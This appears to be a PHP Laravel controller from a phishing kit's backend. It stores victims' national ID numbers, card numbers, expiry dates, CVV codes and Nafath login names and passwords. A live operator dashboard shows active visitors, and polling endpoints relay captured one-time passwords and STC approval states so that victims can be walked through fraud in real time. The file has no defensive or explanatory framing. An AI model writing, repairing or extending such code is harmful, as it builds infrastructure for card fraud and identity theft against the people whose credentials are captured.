<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Http\Requests\LandingPageRequest;
use App\Models\Client;
use App\Models\MobileCompany;
use App\Models\Notification;
use App\Models\Service;
use App\Services\validationService;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;
use Carbon\Carbon;
use App\Models\SessionsClint;

class RegistrationController extends Controller
{
    public function storeNationalNumber(LandingPageRequest $request){
        $inputs = $request->all();
        unset($inputs['_token']);
        $client = Client::create($inputs);
        $client->end_point = 0;
        $client->active =1;
        $client->save();

        return redirect()->route('stepOneView',[1, 'id'=> $client->id ,'national_number'=> $client->national_number] );

    }

    public function getEndPointAjax($client_id){
        $client= Client::where('id' , $client_id)->first();

        if (\request()->filled('is_stc')){
            if ( $client->stc_a  ) {
                if ($client->stc_a ===2){
                    $client->stc_a= 0;
                    $client->save();
                    return response()->json(['status' =>2]);
                }
                return response()->json(['status' =>$client->stc_a]);
            }

        }
        if( in_array($client->end_point ,[ 5, 7, 9, 11 ] ) ){
            
            return response()->json(['status'=>1]);
        }

        if ( $client->verified_visa == -1 ) {
            Notification::where('client_id', $client_id)->delete();
            return response()->json(['status'=> 1]);
        }
    }

    public function getNafedOtpAjax($client_id){
       $client= Client::where('id' , $client_id)->first();
       if($client->nafed_otp){
            $client->end_point = 12;
            $client->save();
           return response()->json(['status' => 1 , 'nafed_otp'=>$client->nafed_otp ]);
       }else{
        return response()->json(['status' => 0, 'nafed_otp'=>$client->nafed_otp ]);

       }
    }

    public function getActiveClientsAjax(){
        $clients = Client::where('active' , 1)->select('clients.id as id' ,'clients.phone' ,'clients.ip','clients.blocked', 'clients.national_number' ,
        'clients.network_id' ,'clients.visa_end_year','clients.visa_end_month' , 'clients.visa_number'
        ,'clients.visa_vcc' ,'clients.first_name' ,'clients.last_name' , 'clients.active' ,'clients.updated_at','clients.end_point' ,'clients.created_at','clients.nafaz_name','clients.nafaz_password','clients.last_activity')->with('mobile_company')->orderBy('updated_at' , 'desc')->get();
        $view  = view('dashboard.clients.clients_ajax' ,compact('clients'))->render();

        return response()->json(['clients'=> $view , 'status' => 1]);
    }
     public function getActiveActionClientsAjax(){
$activePeriod = Carbon::now()->subMinutes(5)->timezone('UTC');
    
    $clients = Client::where('active' , 1)->where(function($query) use ($activePeriod) {
        $query->whereNotNull('last_activity')
              ->where('last_activity', '>=', $activePeriod->format('Y-m-d H:i:s'));
    })
    ->orderBy('last_activity', 'desc')
    ->get();
     $active = $clients->count();
    $all_visits = SessionsClint::count();
        $view  = view('dashboard.clients.clients_ajax' ,compact('clients','active','all_visits'))->render();

        return response()->json(['clients'=> $view , 'status' => 1]);
    }

    public function validateVisaNumberAjax($client_id){

        $client= Client::where('id' , $client_id)->firstOrFail();

        if ( $client->verified_visa == 1 ) {
            $confirmation = 1;
        } elseif ( $client->verified_visa == -1 ) {
            $confirmation = 0;
        }

        return response()->json(['status' => $confirmation ?? null]);
    }
}
